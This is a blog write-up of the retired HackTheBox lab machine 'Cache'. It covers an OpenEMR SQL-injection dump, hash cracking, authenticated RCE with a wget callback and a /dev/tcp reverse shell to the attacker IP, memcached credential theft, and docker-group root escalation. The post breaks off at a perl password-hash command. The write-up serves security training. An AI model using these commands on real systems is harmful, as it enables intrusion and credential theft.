
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="This is a writeup about a retired HacktheBox machine: Cache created by ASHacker and publish on May 9, 2020. This box is classified as a medium machine. The user part is the harder as it involve some enumeration, chaining two exploit for openEMR. The root part is quit easier as it was a simple &quot;exploitation&quot; the box's memcache and the docker permissions." name="description"/>
<meta content="security, boot2root, HTB, Linux, openEMR, docker, memcache" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="HTB: Cache" property="og:title"/>
<meta content="This is a writeup about a retired HacktheBox machine: Cache created by ASHacker and publish on May 9, 2020. This box is classified as a medium machine. The user part is the harder as it involve some enumeration, chaining two exploit for openEMR. The root part is quit easier as it was a simple &quot;exploitation&quot; the box's memcache and the docker permissions." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2020/10/htb-cache.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2020-10-10 18:05:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="HTB" property="article:tag"/>
<meta content="Linux" property="article:tag"/>
<meta content="openEMR" property="article:tag"/>
<meta content="docker" property="article:tag"/>
<meta content="memcache" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – HTB: Cache</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
<li>
<a class="sc-reddit" href="https://www.reddit.com/user/maaggick/" target="_blank">
<i class="fa-brands fa-reddit"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="htb-cache">HTB: Cache</h1>
<p>
      Posted on 10 Oct 2020 in <a href="../../category/security.html">security</a>

        • 8 min read
    </p>
</header>
<div>
<p><img alt="Cache card" class="align-left" src="/media/2020.10/cache_card.png" width="262"/></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/251">Cache</a> created by
<a href="https://www.hackthebox.com/home/users/profile/23227">ASHacker</a> and publish on
May 9, 2020.
This box is classified as a medium machine. The user part is the harder as it
involve some enumeration, chaining two exploit for
<a href="https://www.open-emr.org/">openEMR</a>. The root part is
quit easier as it was a simple "exploitation" the box's <code>memcache</code> and the
docker permissions.</p>
<h1>User</h1>
<h2>Recon</h2>
<p>We start with an nmap scan. Only port 22 (SSH) and 80 (HTTP) are open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Sat May 16 03:28:10 2020 as: nmap -p- -sSV -oN nmap 10.10.10.188
Nmap scan report for 10.10.10.188
Host is up (0.013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 16 03:37:19 2020 -- 1 IP address (1 host up) scanned in 549.65 seconds
</code></pre></div>
<h2>Web</h2>
<p>We look at the website. The homepage is describing the different type of hacker
(<em>sic</em>) (red hats really?).</p>
<p><img alt="Cache home page" class="image-process-article-image" src="/media/2020.10/derivatives/article-image/cache_01.png"/></p>
<p>There is a login page.</p>
<p><img alt="Cache login page" class="image-process-article-image" src="/media/2020.10/derivatives/article-image/cache_02.png"/></p>
<p>When we try to login we see in Burp that there is no request sent.
We look at the JavaScript files loaded by the page and mostly at the file
<code>functionality.js</code> located at <code>http://cache.htb/jquery/functionality.js</code>. The
file contain the credentials for the login form: <code>ash:H@v3_fun</code></p>
<div class="highlight"><pre><span></span><code><span class="nx">$</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>

<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">error_correctPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">error_username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">checkCorrectPassword</span><span class="p">(){</span>
<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">Password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">"#password"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">Password</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">'H@v3_fun'</span><span class="p">){</span>
<span class="w">            </span><span class="nx">alert</span><span class="p">(</span><span class="s2">"Password didn't Match"</span><span class="p">);</span>
<span class="w">            </span><span class="nx">error_correctPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">checkCorrectUsername</span><span class="p">(){</span>
<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">Username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">"#username"</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">Username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s2">"ash"</span><span class="p">){</span>
<span class="w">            </span><span class="nx">alert</span><span class="p">(</span><span class="s2">"Username didn't Match"</span><span class="p">);</span>
<span class="w">            </span><span class="nx">error_username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">$</span><span class="p">(</span><span class="s2">"#loginform"</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="cm">/* Act on the event */</span>
<span class="w">        </span><span class="nx">error_correctPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="nx">checkCorrectPassword</span><span class="p">();</span>
<span class="w">        </span><span class="nx">error_username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="nx">checkCorrectUsername</span><span class="p">();</span>


<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="nx">error_correctPassword</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">error_username</span><span class="w"> </span><span class="o">==</span><span class="kc">false</span><span class="p">){</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="p">});</span>
</code></pre></div>
<p><strong>Note:</strong> the page is also directly accessible without authentication. Some JavaScript on the body tag will make you go back to the login page if you don't have the right <code>referer</code>.</p>
<p>The page is just under construction and there is not a much to do.</p>
<p><img alt="Page under construction" class="image-process-article-image" src="/media/2020.10/derivatives/article-image/cache_03.png"/></p>
<p>We read the author's page again and focus on its other project: HMS.</p>
<p>We modify our /etc/hosts to add the hms.htb domain (still on the same IP address).
We can then browser to the page and get a authentication form for
<a href="https://www.open-emr.org/">openEMR</a>.
The previously find credentials are not working..</p>
<p><img alt="Page under construction" class="image-process-article-image" src="/media/2020.10/derivatives/article-image/cache_04.png"/></p>
<p>We run a <code>dirb</code> against this new domain and found a <code>admin.php</code> file.</p>
<div class="highlight"><pre><span></span><code>dirb http://hms.htb

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May 16 04:43:49 2020
URL_BASE: http://hms.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://hms.htb/ ----
+ http://hms.htb/admin.php (CODE:200|SIZE:937)
==&gt; DIRECTORY: http://hms.htb/common/
==&gt; DIRECTORY: http://hms.htb/config/
</code></pre></div>
<p>We cannot do much with this admin page but it disclose us the exact version of
openEMR used.</p>
<p><img alt="Page under construction" class="image-process-article-image" src="/media/2020.10/derivatives/article-image/cache_05.png"/></p>
<p>We use <code>searchsploit</code> in order to find an exploit for our version but all of
them are authenticated.</p>
<div class="highlight"><pre><span></span><code>kali@kali:~/$ searchsploit openemr  5.0.1 
------------------------------------------------------------ ---------------------------------
Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions    | linux/webapps/45202.txt
OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py
OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
</code></pre></div>
<p>We launch metasploit and search of openEMR exploit. We found a SQL injection
dump exploit.</p>
<div class="highlight"><pre><span></span><code>msf5 &gt; search openemr

Matching Modules
================

  #  Name                                             Disclosure Date  Rank       Check  Description
  -  ----                                             ---------------  ----       -----  -----------
  0  auxiliary/sqli/openemr/openemr_sqli_dump         2019-05-17       normal     Yes    OpenEMR 5.0.1 Patch 6 SQLi Dump
  1  exploit/unix/webapp/openemr_sqli_privesc_upload  2013-09-16       excellent  Yes    OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution
  2  exploit/unix/webapp/openemr_upload_exec          2013-02-13       excellent  Yes    OpenEMR PHP File Upload Vulnerability
</code></pre></div>
<p>We configure the different option, especially the <code>vhost</code> and run the exploit.
We quickly get some result and it start to dump the first table out of 295… 295!
This will take forever.</p>
<div class="highlight"><pre><span></span><code>msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; show options

Module options (auxiliary/sqli/openemr/openemr_sqli_dump):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path to the OpenEMR installation
  VHOST      hms.htb          no        HTTP server virtual host


msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; run
[*] Running module against 10.10.10.188

[*] DB Version: 5.7.30-0ubuntu0.18.04.1
[*] Enumerating tables, this may take a moment...
[*] Identified 295 tables.
[*] Dumping table (1/295): CHARACTER_SETS
^C[-] Stopping running against current target...
[*] Control-C again to force quit all targets.
</code></pre></div>
<p>We grab the exploit code on <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb">rapid7 github</a>
and rewrite the <code>dump_all</code> module in order to just list the different tables (we
just comment the lines dumping and saving the tables).</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="k">def</span><span class="w"> </span><span class="nf">dump_all</span>
<span class="w">    </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'version()'</span>
<span class="w">    </span><span class="n">db_version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exec_payload_and_parse</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"DB Version: </span><span class="si">#{</span><span class="n">db_version</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s1">'Enumerating tables, this may take a moment...'</span><span class="p">)</span>
<span class="w">    </span><span class="n">tables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">enumerate_tables</span>
<span class="w">    </span><span class="n">num_tables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tables</span><span class="o">.</span><span class="n">length</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Identified </span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2"> tables."</span><span class="p">)</span>

<span class="w">    </span><span class="c1"># These tables are impossible to fetch because they increase each request</span>
<span class="w">    </span><span class="n">skiptables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sx">%w[form_taskman log log_comment_encrypt]</span>
<span class="w">    </span><span class="n">tables</span><span class="o">.</span><span class="n">each_with_index</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">table</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="o">|</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="n">skiptables</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="n">table</span><span class="p">)</span>
<span class="w">        </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Skipping table (</span><span class="si">#{</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">      </span><span class="k">else</span>
<span class="w">        </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Dumping table (</span><span class="si">#{</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">        </span><span class="c1">#table_data = walk_table(table)</span>
<span class="w">        </span><span class="c1">#save_csv(table_data, table)</span>
<span class="w">      </span><span class="k">end</span>
<span class="w">    </span><span class="k">end</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Dumped all tables to </span><span class="si">#{</span><span class="no">Msf</span><span class="o">::</span><span class="no">Config</span><span class="o">.</span><span class="n">loot_directory</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">  </span><span class="k">end</span>
</code></pre></div>
<p>We load our
<a href="https://github.com/rapid7/metasploit-framework/wiki/Running-Private-Modules">private msf module</a>
configure it and run it.</p>
<div class="highlight"><pre><span></span><code>msf5 auxiliary(test/openemr_sqli_dump) &gt; run
[*] Running module against 10.10.10.188

[*] DB Version: 5.7.30-0ubuntu0.18.04.1
[*] Enumerating tables, this may take a moment...
[*] Identified 295 tables.
[*] Dumping table (1/295): CHARACTER_SETS
&lt;snip&gt;
[*] Dumping table (284/295): therapy_groups_counselors
[*] Dumping table (285/295): therapy_groups_participant_attendance
[*] Dumping table (286/295): therapy_groups_participants
[*] Dumping table (287/295): transactions
[*] Dumping table (288/295): user_settings
[*] Dumping table (289/295): users
[*] Dumping table (290/295): users_facility
[*] Dumping table (291/295): users_secure
[*] Dumping table (292/295): valueset
[*] Dumping table (293/295): version
[*] Dumping table (294/295): voids
[*] Dumping table (295/295): x12_partners
</code></pre></div>
<p>We quickly look at the table structure on the <a href="https://www.open-emr.org/wiki/index.php/Database_Structure">openEMR wiki</a>
and dump the table <code>users</code> with the index 288 (yes the table index start at 0).</p>
<p>It contains nothing interesting as the users' password where moved into the
<code>users_secure</code> table (an attentive reading of the wiki page will had give us
that immediately).</p>
<p>We re-wrote our personal module in order to dump the table <code>users_secure</code> with
the index 290. The <code>dump_all</code> function now looks like the following:</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="k">def</span><span class="w"> </span><span class="nf">dump_all</span>
<span class="w">    </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'version()'</span>
<span class="w">    </span><span class="n">db_version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exec_payload_and_parse</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"DB Version: </span><span class="si">#{</span><span class="n">db_version</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">      </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"version 2"</span><span class="p">)</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s1">'Enumerating tables, this may take a moment...'</span><span class="p">)</span>
<span class="w">    </span><span class="n">tables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">enumerate_tables</span>
<span class="w">    </span><span class="n">num_tables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tables</span><span class="o">.</span><span class="n">length</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Identified </span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2"> tables."</span><span class="p">)</span>

<span class="w">    </span><span class="c1"># These tables are impossible to fetch because they increase each request</span>
<span class="w">    </span><span class="n">skiptables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sx">%w[form_taskman log log_comment_encrypt]</span>
<span class="w">    </span><span class="n">tables</span><span class="o">.</span><span class="n">each_with_index</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">table</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="o">|</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="n">skiptables</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="n">table</span><span class="p">)</span>
<span class="w">        </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Skipping table (</span><span class="si">#{</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">      </span><span class="k">else</span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">290</span>
<span class="w">            </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Dumping table (</span><span class="si">#{</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">num_tables</span><span class="si">}</span><span class="s2">): </span><span class="si">#{</span><span class="n">table</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">            </span><span class="n">table_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">walk_table</span><span class="p">(</span><span class="n">table</span><span class="p">)</span>
<span class="w">            </span><span class="n">save_csv</span><span class="p">(</span><span class="n">table_data</span><span class="p">,</span><span class="w"> </span><span class="n">table</span><span class="p">)</span>
<span class="w">        </span><span class="k">end</span>
<span class="w">      </span><span class="k">end</span>
<span class="w">    </span><span class="k">end</span>
<span class="w">    </span><span class="n">print_status</span><span class="p">(</span><span class="s2">"Dumped all tables to </span><span class="si">#{</span><span class="no">Msf</span><span class="o">::</span><span class="no">Config</span><span class="o">.</span><span class="n">loot_directory</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="w">  </span><span class="k">end</span>
</code></pre></div>
<p>We rerun our module and get the looted data, this time we have the username and
a password hash!</p>
<div class="highlight"><pre><span></span><code>kali@kali:~/$ cat /home/kali/.msf4/loot/20200516080433_default_10.10.10.188_openemr.users_se_390635.csv
id,username,password,salt,last_update,password_history1,salt_history1,password_history2,salt_history2
1,openemr_admin,$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.,$2a$05$l2sTLIG6GTBeyBf7TAKL6A$,2019-11-21 06:38:40,"","","",""
</code></pre></div>
<p>We load the has inside <code>john</code> the ripper and quickly get the password <code>xxxxxx</code>.</p>
<div class="highlight"><pre><span></span><code>$ john hash
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
xxxxxx           (?)
1g 0:00:00:00 DONE 2/3 (2020-05-16 14:07) 4.347g/s 5008p/s 5008c/s 5008C/s stinky..88888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div>
<p>We can now connect on OpenEMR using our credentials <code>openemr_admin:xxxxxx</code>.</p>
<p><img alt="OpenEMR authenticated" class="image-process-article-image" src="/media/2020.10/derivatives/article-image/cache_06.png"/></p>
<p>We then fireup the authenticated exploit for openEMR found previously. At the
same time we start a simple Python HTTP server in order to check our RCE. It
works.</p>
<div class="highlight"><pre><span></span><code>$python ./45161.py 'http://hms.htb' -u openemr_admin -p xxxxxx -c 'wget http://10.10.14.156:8081/$(id)t 0&gt;&amp;1'

$python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.10.188 - - [16/May/2020 08:44:58] code 404, message File not found
10.10.10.188 - - [16/May/2020 08:44:58] "GET /uid=33(www-data) HTTP/1.1" 404 -
</code></pre></div>
<p>We change our payload in order to get a reverse shell. We launch a <code>netcat</code> to
catch our reverse shell.</p>
<div class="highlight"><pre><span></span><code>$python ./45161.py 'http://hms.htb' -u openemr_admin -p xxxxxx -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.156/4242 0&gt;&amp;1'

$nc -l -p 4242
bash: cannot set terminal process group (2504): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ whoami
whoami
www-data
</code></pre></div>
<p>We use python in order to get a better shell. And switch user to <code>ash</code> reusing
the password found in the JavaScript file. This allow us to get to the
<code>user.txt</code> flag.</p>
<div class="highlight"><pre><span></span><code>www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ su ash
su ash
Password: H@v3_fun

ash@cache:/var/www/hms.htb/public_html/interface/main$ cd
cd
  ash@cache:~$ cat user.txt
cat user.txt
a3014a6da5ebe33cd897b66b44397ef1
</code></pre></div>
<h1>Root</h1>
<p>We use <a href="https://github.com/DominicBreuker/pspy">pspy</a> to enumerate the running
process. We see that a few process are running especially <code>dockerd</code> and
<code>memecached</code>. Given the name of the box is certain that the <code>memcached</code> process
is involved.</p>
<div class="highlight"><pre><span></span><code>www-data@cache:/tmp/.plop$ ./pspy64
./pspy64
&lt;snip&gt;
done
2020/05/16 16:16:33 CMD: UID=103  PID=994    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2020/05/16 16:16:33 CMD: UID=0    PID=992    | /usr/sbin/cron -f 
2020/05/16 16:16:33 CMD: UID=0    PID=977    | /usr/bin/dockerd -H fd:// 
2020/05/16 16:16:33 CMD: UID=0    PID=969    | /usr/lib/accountsservice/accounts-daemon 
2020/05/16 16:16:33 CMD: UID=111  PID=964    | /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid 
2020/05/16 16:16:33 CMD: UID=0    PID=961    | /usr/bin/VGAuthService 
2020/05/16 16:16:33 CMD: UID=0    PID=96     |
</code></pre></div>
<p>A few Google search lead us to an article about
<a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">testing memcached</a>.
We connect to the service using telnet. We list the item available, get the
<code>user</code> and the <code>passwd</code> items.</p>
<div class="highlight"><pre><span></span><code>www-data@cache:/var/cache/apt$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
get user
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
</code></pre></div>
<p>We get back to an interactive shell and switch user to <code>luffy</code>. We quickly
identify that we belong to the <code>docker</code> group and display the <code>docker</code> version.</p>
<div class="highlight"><pre><span></span><code>$ su luffy
su luffy
Password: 0n3_p1ec3

luffy@cache:/var/www/hms.htb/public_html/interface/main$ id
id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)

luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker --version
docker --version
Docker version 18.09.1, build 4c52b90
</code></pre></div>
<p>We use <code>searchsploit</code> again but th listed one is destructive.</p>
<p>A few Google search lead us to
<a href="https://www.hackingarticles.in/docker-privilege-escalation/">another article</a>
explaining how you can get a full access to the host system by mounting it into
the docker machine. We quickly list the available images. Only a <code>ubuntu</code> is
available.</p>
<div class="highlight"><pre><span></span><code>luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker image ls
docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB
</code></pre></div>
<p>We mount <code>/root/</code> into our docker machine and that allow us to get the
<code>root.txt</code> flag.</p>
<div class="highlight"><pre><span></span><code>luffy@cache:~/.plop$ docker run -v /root/:/mnt -it ubuntu
docker run -v /root/:/mnt -it ubuntu
root@884f0f892e34:/#ls /mnt
ls /mnt
root.txt
root@884f0f892e34:/# cat /mnt/root.txt
cat /mnt/root.txt
da8b94288d919f4c6089fccdaa318832
</code></pre></div>
<p>We could also have mounted the whole file system <code>/</code> and get the content of
<code>/etc/shadow</code> to crack the root password. Or even rewrite the root password in <code>/etc/shadow</code>.</p>
<p>Another docker trick is to <code>chroot</code> into the mounted folder to get a root to
directly get a shell on the system: <code>docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh</code></p>
<p>We can then generate a new password using <code>perl</code></p>
<div class="highlight"><pre><span></span><code># perl -e 'print crypt("password","\$6\$saltsalt\$") . "\n"'
perl -e 'print crypt("password","\$6\$saltsalt\$") . "\n"'
